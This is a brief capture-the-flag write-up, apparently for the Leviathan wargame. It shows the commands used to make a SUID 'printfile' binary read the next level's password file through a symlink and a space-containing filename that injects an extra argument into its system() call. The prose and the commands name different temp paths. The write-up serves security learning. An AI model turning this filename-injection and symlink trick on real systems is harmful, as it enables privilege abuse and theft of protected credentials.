# Leviathan Level 2 → 3

## Objective
Find the password for leviathan3

## Approach
Found `printfile` SUID binary owned by leviathan3.
Used `ltrace` to understand its behavior: it uses `/bin/cat` via system().
Created a symlink from `/tmp/file.log` pointing to `/etc/leviathan_pass/leviathan3`.
Exploited the space in filename to trick the binary into reading the password file.

## Commands Used
```bash
ls -la
./printfile
ltrace ./printfile /tmp/work_123/test.txt
mkdir -p /tmp/work_123
ln -s /etc/leviathan_pass/leviathan3 /tmp/work_123/foo
touch "/tmp/work_123/foo bar"
~/printfile "/tmp/work_123/foo bar"
```

## What I Learned
- SUID binaries inherit elevated privileges
- Symlink attacks can redirect file reads
- Spaces in filenames can cause unexpected behavior in system() calls
- ltrace reveals internal system() calls with full arguments
